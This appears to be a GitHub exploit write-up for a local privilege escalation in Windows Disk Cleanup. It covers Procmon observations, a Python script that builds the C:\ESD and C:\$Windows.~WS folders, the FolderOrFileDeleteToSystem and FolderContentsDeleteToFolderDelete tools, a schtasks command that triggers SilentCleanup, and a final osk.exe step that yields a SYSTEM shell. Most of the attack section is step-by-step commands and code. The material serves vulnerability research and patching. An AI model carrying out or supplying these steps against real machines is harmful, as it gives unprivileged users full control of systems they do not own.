# Windows Disk Cleanup Privilege Escalation Exploit

## Vulnerability Overview

The new version of `cleanmgr.exe` includes a call to the `SetProcessMitigationPolicy` function, which introduces security enhancements but can still be bypassed under specific conditions.

## Technical Analysis

### Mitigation Policy Implementation
```cpp
SetProcessMitigationPolicy(MitigationPolicy, 16);
```
With MitigationPolicy set to 16, this corresponds to ProcessRedirectionTrustPolicy, indicating that cleanmgr.exe has Redirection Guard enabled.

### Vulnerability Classification

This vulnerability relates to CWE-59: Improper Link Resolution Before File Access ('Link Following'), where the Redirection Guard can be bypassed through specific techniques.

### Research Background
Based on research from security researchers Simon Zuckerbraun and enigma0x3:

Simon Zuckerbraun: "From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP"

enigma0x3: "Bypass UAC"

### Key Insight
The SilentCleanup task possesses sufficient privileges to delete the C:/Config.msi folder. The exploitation requires finding an Arbitrary Folder Delete/Move/Rename vulnerability within the SilentCleanup task, which runs cleanmgr.exe with "Run with highest privileges".

### Behavioral Analysis via Procmon
Initial Observations
When running the SilentCleanup task and monitoring cleanmgr.exe behavior:

<img width="1024" height="589" alt="image" src="https://github.com/user-attachments/assets/12affe8c-e75c-4852-a489-70fad29655ac" />


The process checks for the existence of specific folders:

Verifies if listed folders exist

Note: Does not verify if C:\ESD is a junction

Does check Windows and Download folders (though this aspect isn't deeply explored here)

Folder Structure Setup
Create the following folder structure using the python script provided:
```
C:\$Windows.~WS
C:\ESD\Windows
C:\ESD\Download
```

After populating these folders with dummy files and rerunning SilentCleanup:
<img width="824" height="126" alt="image" src="https://github.com/user-attachments/assets/cbeccd11-e255-4f48-a951-5f88a18c3bea" />

Observation: SilentCleanup deletes contents within the Windows and Download folders. This behavior can be leveraged using the "From Folder Contents Delete to SYSTEM EoP" technique.

### Exploitation Methodology
```
# Python script creates initial folder structure
import os

# Create required directories
folders = [
    r"C:\$Windows.~WS",
    r"C:\ESD\Windows", 
    r"C:\ESD\Download"
]

for folder in folders:
    os.makedirs(folder, exist_ok=True)
    
# Insert dummy files
for folder in folders[1:]:  # Skip the first folder
    with open(os.path.join(folder, "dummy.txt"), "w") as f:
        f.write("placeholder")
        
print("Setup complete - script paused")
# PAUSE FOR EXPLOIT SETUP
```
### Exploit Configuration
```
# Run FolderOrFileDeleteToSystem to setup Config.msi
FolderOrFileDeleteToSystem.exe

# Run FolderContentsDeleteToFolderDelete for redirection
FolderContentsDeleteToFolderDelete.exe
```

### Trigger Exploitation
```
# Resume the Python script to complete setup
# Run SilentCleanup to trigger content cleanup
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"

# Final privilege escalation
osk.exe
# Then press Ctrl-Alt-Delete
```
[<img width="1566" height="960" alt="image" src="https://github.com/user-attachments/assets/729433af-ad39-4aea-9183-bdc568f097bc" />](https://private-user-images.githubusercontent.com/65118347/454517887-d66b43ea-6706-4bce-94c4-ca3a6e97857f.mp4?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjEwMjgwNDIsIm5iZiI6MTc2MTAyNzc0MiwicGF0aCI6Ii82NTExODM0Ny80NTQ1MTc4ODctZDY2YjQzZWEtNjcwNi00YmNlLTk0YzQtY2EzYTZlOTc4NTdmLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEwMjElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMDIxVDA2MjIyMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWYxMmNhMDcyZmI3MDc3YThkOTY1NWM2NGJlNzZhMWIyNmViMTJiMDEyYjM3ZTgwMTI3NTI2ZjQ1OWVhMzRlM2UmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NJ8TgYL0qDMIFPqGwsTDJOShisJXXoG5G4CjzZ2EU1E)
